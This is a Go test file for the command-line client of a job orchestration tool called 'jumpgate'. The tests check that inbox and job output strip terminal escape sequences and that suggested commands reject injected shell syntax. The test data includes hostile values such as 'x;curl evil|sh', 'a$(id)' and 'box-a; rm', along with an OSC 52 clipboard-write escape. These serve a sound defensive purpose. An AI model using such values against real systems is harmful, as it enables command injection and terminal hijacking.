package main

import (
	"bytes"
	"errors"
	"strings"
	"testing"
	"time"

	"github.com/valve-tech/jumpgate/internal/api"
	"github.com/valve-tech/jumpgate/internal/apiclient"
	"github.com/valve-tech/jumpgate/internal/catalog"
)

func TestPrintInboxPutsQuestionsUnderTheirJob(t *testing.T) {
	now := time.Date(2026, 10, 9, 12, 0, 0, 0, time.UTC)
	hb := now.Add(-2 * time.Minute)
	in := api.JobsInbox{Jobs: []api.JobView{
		{Target: "box-a", ID: "0123456789abcdef", Kind: "node.migrate-names", State: "needs-decision", Step: 1, Steps: make([]api.JobStepView, 8),
			Question: &api.JobQuestion{ID: "stop-units-0-busy-user", Prompt: "1 process still runs", Options: []api.JobOption{{ID: "retry", Label: "Check again"}, {ID: "stop-processes", Label: "Stop them"}}},
			Lease:    api.JobLease{Mine: true, Label: "this controller"}},
		{Target: "box-b", ID: "fedcba9876543210", Kind: "node.migrate-names", State: "running", Step: 3, Steps: make([]api.JobStepView, 8),
			Lease: api.JobLease{Owner: "0xbbbb", HeartbeatAt: &hb}},
	}, Errors: []api.JobsError{{Target: "box-c", Error: api.Error{Message: "could not reach the agent"}}}}
	var b bytes.Buffer
	printInbox(&b, in, "", now)
	out := b.String()
	for _, want := range []string{"HOST", "box-a", "0123456789abcdef", "needs-decision", "2/8", "this controller",
		"? 1 process still runs", "jumpgate 'jobs' 'decide' 'box-a' '0123456789abcdef' 'stop-units-0-busy-user' OPTION", "OPTION is one of: retry, stop-processes",
		"box-b", "silent 2m", "box-c: could not reach the agent"} {
		if !strings.Contains(out, want) {
			t.Errorf("output lacks %q:\n%s", want, out)
		}
	}
	b.Reset()
	printInbox(&b, in, "box-b", now)
	if strings.Contains(b.String(), "box-a") {
		t.Errorf("a host filter still printed other boxes:\n%s", b.String())
	}
}

// Text from a box (a prompt, a title, an error) must not reach the terminal
// with the escape sequences it may carry.
func TestCLIPrintsNoControlBytesFromTheBox(t *testing.T) {
	now := time.Date(2026, 10, 9, 12, 0, 0, 0, time.UTC)
	evil := "x\x1b]52;c;AAAA\x07y\x1b[2Jz\r\x00"
	in := api.JobsInbox{Jobs: []api.JobView{{Target: "box-a", ID: "0123456789abcdef", Kind: "k", State: "needs-decision", Steps: make([]api.JobStepView, 2),
		Question: &api.JobQuestion{ID: "q", Prompt: evil, Options: []api.JobOption{{ID: "o" + evil}}}}},
		Errors: []api.JobsError{{Target: "box-c", Error: api.Error{Message: evil}}}}
	var b bytes.Buffer
	printInbox(&b, in, "", now)
	d := api.JobDetail{Job: api.JobView{Target: "t", ID: "i", Title: evil, State: evil, Steps: []api.JobStepView{{State: "s", Title: evil}}},
		Log: []api.JobLogLine{{Text: evil, At: now}}}
	printJobDetail(&b, d)
	out := b.String()
	for _, bad := range []string{"\x1b", "\x07", "\x00", "\r"} {
		if strings.Contains(out, bad) {
			t.Errorf("output carries %q:\n%q", bad, out)
		}
	}
	if !strings.Contains(out, "xyz") {
		t.Errorf("the text around the escapes was lost:\n%q", out)
	}
}

// A box chooses the ids in a suggested command; one that is not shaped like
// an id must never reach a line the operator may paste into a shell.
func TestSuggestedCommandsCarryNoBoxSyntax(t *testing.T) {
	now := time.Date(2026, 10, 9, 12, 0, 0, 0, time.UTC)
	for _, bad := range []string{"x;curl evil|sh", "a$(id)", "a`id`", "a b", "A", "-x", "a'b", "a&&b", ""} {
		for name, j := range map[string]api.JobView{
			"option":   {Target: "box-a", ID: "0123456789abcdef", Steps: make([]api.JobStepView, 1), Question: &api.JobQuestion{ID: "q", Prompt: "p", Options: []api.JobOption{{ID: "retry"}, {ID: bad}}}},
			"question": {Target: "box-a", ID: "0123456789abcdef", Steps: make([]api.JobStepView, 1), Question: &api.JobQuestion{ID: bad, Prompt: "p", Options: []api.JobOption{{ID: "retry"}}}},
			"job":      {Target: "box-a", ID: bad, Steps: make([]api.JobStepView, 1), Question: &api.JobQuestion{ID: "q", Prompt: "p", Options: []api.JobOption{{ID: "retry"}}}},
			"host":     {Target: bad, ID: "0123456789abcdef", Steps: make([]api.JobStepView, 1), Question: &api.JobQuestion{ID: "q", Prompt: "p", Options: []api.JobOption{{ID: "retry"}}}},
		} {
			var b bytes.Buffer
			printInbox(&b, api.JobsInbox{Jobs: []api.JobView{j}}, "", now)
			out := b.String()
			if strings.Contains(out, "jumpgate 'jobs'") || !strings.Contains(out, "cannot be shown as a command") {
				t.Errorf("%s %q still printed a command:\n%s", name, bad, out)
			}
			if bad != "" && bad != "A" && bad != "-x" && strings.ContainsAny(out, ";|$`&") && strings.Contains(out, "decide "+bad) {
				t.Errorf("%s %q leaked:\n%s", name, bad, out)
			}
		}
	}
	if _, ok := suggestCommand([]string{"jobs"}, tok{hostToken, "box-a; rm"}); ok {
		t.Error("a host with a semicolon was accepted")
	}
}

func TestMigrateNamesWantsYes(t *testing.T) {
	for _, args := range [][]string{{"box-a"}, {}, {"--yes"}, {"box-a", "box-b", "--yes"}, {"box-a", "--yes", "--force"}} {
		if code := cmdMigrateNames(args); code != exitCode("usage") {
			t.Fatalf("migrate-names %v: exit %d", args, code)
		}
	}
}

// Global Constraint 1, ruling P10: the legacy name reaches the help text only
// through catalog.LegacyNames.
func TestMigrateNamesHelpNamesBothSets(t *testing.T) {
	for _, h := range commandHelp {
		if strings.HasPrefix(h.name, "migrate-names") {
			if !strings.Contains(h.text, catalog.LegacyNames.Prefix) || !strings.Contains(h.text, catalog.CurrentNames.Prefix) {
				t.Fatalf("help %q", h.text)
			}
			return
		}
	}
	t.Fatal("no migrate-names help")
}

// Ruling P13: jobs output prints each journal line as it arrives, without
// the control bytes a step's output may carry, and stops when the server
// refuses the job.
func TestFollowOutputPrintsLinesAndStopsOnARefusal(t *testing.T) {
	at := time.Date(2026, 10, 9, 12, 0, 0, 0, time.UTC)
	ch := make(chan apiclient.Update[[]api.JobOutputLine], 3)
	ch <- apiclient.Update[[]api.JobOutputLine]{Has: true, Value: []api.JobOutputLine{
		{Unit: "jumpgate-job-0123456789abcdef-stop-units-0.service", Line: "stopping\x1b[2J the\tunits\r\x07", At: at}}}
	ch <- apiclient.Update[[]api.JobOutputLine]{Err: &api.Error{Message: "no such job", Code: api.CodeJobNotFound}}
	ch <- apiclient.Update[[]api.JobOutputLine]{Has: true, Value: []api.JobOutputLine{{Line: "after the refusal", At: at}}}
	close(ch)
	var b bytes.Buffer
	err := followOutput(&b, ch)
	var e *api.Error
	if !errors.As(err, &e) || e.Code != api.CodeJobNotFound {
		t.Fatalf("followOutput = %v", err)
	}
	out := b.String()
	if !strings.Contains(out, "stop-units-0") || !strings.Contains(out, "stopping the\tunits\n") || strings.ContainsAny(out, "\x1b\x07\r") || strings.Contains(out, "after the refusal") {
		t.Fatalf("output:\n%q", out)
	}
}

func TestJobsUsage(t *testing.T) {
	// Only malformed verbs: a bare HOST would connect to (and maybe start) a server.
	for _, args := range [][]string{{"show", "box-a"}, {"decide", "box-a", "j", "q"}, {"adopt"}, {"adopt", "box-a"}, {"output"}, {"output", "box-a", "0123456789abcdef"}} {
		if code := cmdJobs(args); code != exitCode("usage") {
			t.Errorf("jobs %v: exit %d", args, code)
		}
	}
}
